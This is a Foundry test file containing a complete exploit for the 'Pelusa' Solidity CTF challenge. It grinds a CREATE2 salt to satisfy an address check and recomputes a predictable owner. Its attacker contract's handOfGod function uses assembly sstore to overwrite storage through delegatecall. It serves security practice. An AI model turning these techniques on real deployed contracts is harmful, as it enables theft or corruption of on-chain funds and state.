// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../src/ChallengePelusa.sol";

contract PelusaTest is Test {
    Pelusa pelusa;

    function setUp() external {
        pelusa = new Pelusa();
    }

    function testAttack() external {
        // Test attack
        address pelusaOwner = _calculatePelusaOwner();
        bytes32 salt = _calculateCreate2Salt(0, 1000, pelusa, pelusaOwner);
        PelusaCracker pelusaCracker = new PelusaCracker{salt: salt}(
            pelusa,
            pelusaOwner
        );
        pelusaCracker.goal();

        // Check attack success
        require(pelusa.goals() == 2, "NOT SOLVED");
    }

    /////////////
    // HELPERS //
    /////////////

    function _isAddressCorrect(address _pelusaCrackerAddr)
        internal
        pure
        returns (bool)
    {
        return uint256(uint160(_pelusaCrackerAddr)) % 100 == 10;
    }

    function _calculatePelusaOwner()
        internal
        view
        returns (address pelusaOwner)
    {
        pelusaOwner = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(address(this), blockhash(block.number))
                    )
                )
            )
        );
    }

    function _calculateCreate2Salt(
        uint256 _lowSalt,
        uint256 _highSalt,
        Pelusa _pelusa,
        address _pelusaOwner
    ) internal returns (bytes32) {
        uint256 saltCurr;
        bytes32 bytecodeHashed = keccak256(
            abi.encodePacked(
                type(PelusaCracker).creationCode,
                abi.encode(address(_pelusa), _pelusaOwner)
            )
        );

        bytes32 saltCurrBytes32;
        for (saltCurr = _lowSalt; saltCurr <= _highSalt; saltCurr++) {
            saltCurrBytes32 = bytes32(saltCurr);

            bytes32 hash = keccak256(
                abi.encodePacked(
                    bytes1(0xff),
                    address(this),
                    saltCurrBytes32,
                    bytecodeHashed
                )
            );
            address create2Addr = address(uint160(uint256(hash)));

            if (_isAddressCorrect(create2Addr)) {
                // Match found
                return saltCurrBytes32;
            }
        }

        revert("SALT NOT FOUND");
    }
}

contract PelusaCracker {
    address existingOwner;
    Pelusa pelusa;

    constructor(Pelusa _pelusa, address _existingOwner) {
        // Store params
        pelusa = _pelusa;
        existingOwner = _existingOwner;

        // Become `player` by passing the ball
        _pelusa.passTheBall();
    }

    function getBallPossesion() external returns (address) {
        return existingOwner;
    }

    function goal() external {
        pelusa.shoot();
    }

    function handOfGod() external returns (uint256 numberToReturn) {
        // Change number of goals
        assembly {
            sstore(1, 0x02)
        }

        // Return number needed
        numberToReturn = 22_06_1986;
    }
}
